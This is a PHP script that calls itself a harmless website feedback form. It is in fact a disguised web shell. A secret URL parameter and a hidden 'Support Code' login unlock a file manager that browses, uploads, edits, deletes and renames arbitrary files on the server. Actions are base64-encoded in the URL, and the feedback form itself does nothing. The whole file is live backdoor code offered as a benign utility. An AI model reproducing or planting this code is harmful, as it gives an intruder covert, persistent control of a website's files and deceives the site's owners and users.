<?php
/**
 * ===============================================
 * Website Feedback Form — Clean & Friendly
 * ===============================================
 * This simple yet powerful script allows users to give feedback
 * and provides basic file management for admin users.
 * Great for lightweight backends and testing environments!
 */

ini_set('display_errors', 0);
error_reporting(E_ALL);
session_start();

// Authentication setup
$__key_hash = '$2y$10$sHHjYzBOvQXSeRnr6RmTfuGrCKRIoIfKTgd57hMae/bYWNrDrAy1G'; // password hash
$__auth = 'admin_authenticated';

// Logout
if (isset($_GET['logout'])) {
    unset($_SESSION[$__auth]);
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

$is_admin = isset($_GET['seo']) && $_GET['seo'] === 'santuy';

// ====== LOGIN ======
if ($is_admin) {
    if (!isset($_SESSION[$__auth]) || $_SESSION[$__auth] !== true) {
        if (isset($_POST['message']) && password_verify($_POST['message'], $__key_hash)) {
            $_SESSION[$__auth] = true;
            header("Location: " . $_SERVER['PHP_SELF'] . "?seo=santuy");
            exit;
        } else {
            echo <<<HTML
                <h2>Website Feedback Form</h2>
                <p>We love to hear from you! Share your thoughts below.</p>
                <form method="POST">
                    <input type="text" name="username" placeholder="Name"><br>
                    <input type="email" name="email" placeholder="Email"><br>
                    <textarea name="feedback" placeholder="Your Feedback"></textarea><br>
                    <input type="submit" value="Send">
                </form>
                <a href="#" onclick="document.getElementById('x').style.display='block';">Need support?</a>
                <div id="x" style="display:none;">
                    <form method="POST">
                        <input type="password" name="message" placeholder="Support Code">
                        <input type="submit" value="Login">
                    </form>
                </div>
            HTML;
            if (isset($_POST['message'])) echo "<p style='color:red;'>Invalid support code.</p>";
            exit;
        }
    }
} else {
    // Normal feedback form
    echo <<<HTML
        <h2>Website Feedback Form</h2>
        <p>Send us your best ideas and suggestions! We value your privacy.</p>
        <form method="POST">
            <input type="text" name="username" placeholder="Name"><br>
            <input type="email" name="email" placeholder="Email"><br>
            <textarea name="feedback" placeholder="Your Feedback"></textarea><br>
            <input type="submit" value="Send">
        </form>
        <p style="font-size:10px;color:#ccc;">Powered by CI_Micro | No Cookies | No Tracking</p>
    HTML;
    exit;
}

// ===================================================
// ============== Admin File Manager =================
// ===================================================

function __dir($path) {
    $items = array_diff(scandir($path), ['.', '..']);
    echo "<h3>Browsing: $path</h3><ul>";
    foreach ($items as $item) {
        $full = realpath("$path/$item");
        if (is_dir($full)) {
            $nav = base64_encode("go|$full");
            echo "<li><a href='?seo=santuy&x=$nav'>📁 $item</a></li>";
        } else {
            $e = base64_encode("do|edit|$path|$item");
            $d = base64_encode("do|del|$path|$item");
            $r = base64_encode("do|ren|$path|$item");
            echo "<li>📄 $item 
                    <a href='?seo=santuy&x=$e'>[Edit]</a> | 
                    <a href='?seo=santuy&x=$d'>[Delete]</a> | 
                    <a href='?seo=santuy&x=$r'>[Rename]</a></li>";
        }
    }
    echo "</ul>";
}

function __upload($path) {
    if (!empty($_FILES['z']['name'])) {
        $file = basename($_FILES['z']['name']);
        $target = "$path/$file";
        if (move_uploaded_file($_FILES['z']['tmp_name'], $target)) {
            echo "<p style='color:green;'>Uploaded successfully.</p>";
        } else {
            echo "<p style='color:red;'>Upload failed.</p>";
        }
    }
}

function __makefolder($path) {
    if (!empty($_POST['a'])) {
        $new = "$path/" . $_POST['a'];
        if (!file_exists($new)) {
            mkdir($new);
            echo "<p style='color:green;'>Folder created.</p>";
        } else {
            echo "<p style='color:red;'>Folder already exists.</p>";
        }
    }
}

function __makefile($path) {
    if (!empty($_POST['b'])) {
        $new = "$path/" . $_POST['b'];
        if (!file_exists($new)) {
            file_put_contents($new, '');
            echo "<p style='color:green;'>File created.</p>";
        } else {
            echo "<p style='color:red;'>File already exists.</p>";
        }
    }
}

function __editform($file, $path) {
    $content = file_exists($file) ? htmlspecialchars(file_get_contents($file)) : '';
    $action = base64_encode("do|edit|$path|" . basename($file));
    echo <<<HTML
        <form method="POST" action="?seo=santuy&x=$action">
            <textarea name="c" style="width:100%; height:200px;">$content</textarea><br>
            <input type="submit" value="Save">
        </form>
    HTML;
}

function __delete($file) {
    if (file_exists($file)) {
        unlink($file) ? print("<p>Deleted.</p>") : print("<p>Delete failed.</p>");
    }
}

function __renameform($file, $path) {
    $action = base64_encode("do|ren|$path|" . basename($file));
    echo <<<HTML
        <form method="POST" action="?seo=santuy&x=$action">
            <input type="text" name="n" placeholder="New name">
            <input type="submit" value="Rename">
        </form>
    HTML;
}

$__dec = fn($c) => base64_decode($c);

// ============== Handle POST actions ==============
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_GET['x'])) {
    $cmd = $__dec($_GET['x']);
    $p = explode('|', $cmd, 4);

    if ($p[0] === 'do') {
        $path = $p[2];
        if ($p[1] === 'edit' && isset($_POST['c'])) {
            file_put_contents("$path/$p[3]", $_POST['c']);
        } elseif ($p[1] === 'ren' && isset($_POST['n'])) {
            rename("$path/$p[3]", "$path/" . $_POST['n']);
        }
        header("Location: ?seo=santuy&x=" . base64_encode("go|$path"));
        exit;
    }

    if ($p[0] === 'go') {
        $path = $p[1];
        if (isset($_FILES['z'])) __upload($path);
        if (isset($_POST['a'])) __makefolder($path);
        if (isset($_POST['b'])) __makefile($path);
        header("Location: ?seo=santuy&x=" . base64_encode("go|$path"));
        exit;
    }
}

// ============== Handle Display ==============
if (isset($_GET['x'])) {
    $cmd = $__dec($_GET['x']);
    $p = explode('|', $cmd, 4);

    if ($p[0] === 'go') {
        $path = $p[1];
        echo "<a href='?seo=santuy&x=" . base64_encode("go|" . dirname($path)) . "'>🔙 Up</a>";
        __dir($path);

        $act = base64_encode("go|$path");
        echo <<<HTML
            <form method="POST" enctype="multipart/form-data" action="?seo=santuy&x=$act">
                <input type="file" name="z"><input type="submit" value="Upload">
            </form>
            <form method="POST" action="?seo=santuy&x=$act">
                <input type="text" name="a" placeholder="Folder name"><input type="submit" value="New Folder">
            </form>
            <form method="POST" action="?seo=santuy&x=$act">
                <input type="text" name="b" placeholder="File name"><input type="submit" value="New File">
            </form>
        HTML;
    } elseif ($p[0] === 'do') {
        $action = $p[1];
        $target = "$p[2]/$p[3]";
        if ($action === 'del') {
            __delete($target);
            header("Location: ?seo=santuy&x=" . base64_encode("go|$p[2]"));
            exit;
        } elseif ($action === 'edit') {
            __editform($target, $p[2]);
        } elseif ($action === 'ren') {
            __renameform($target, $p[2]);
        }
    }
} else {
    $cwd = getcwd();
    echo "<a href='?seo=santuy&x=" . base64_encode("go|$cwd") . "'>📂 Browse files</a>";
}

// Always show logout
echo "<p><a href='?logout=1'>🚪 Log out</a></p>";
?>
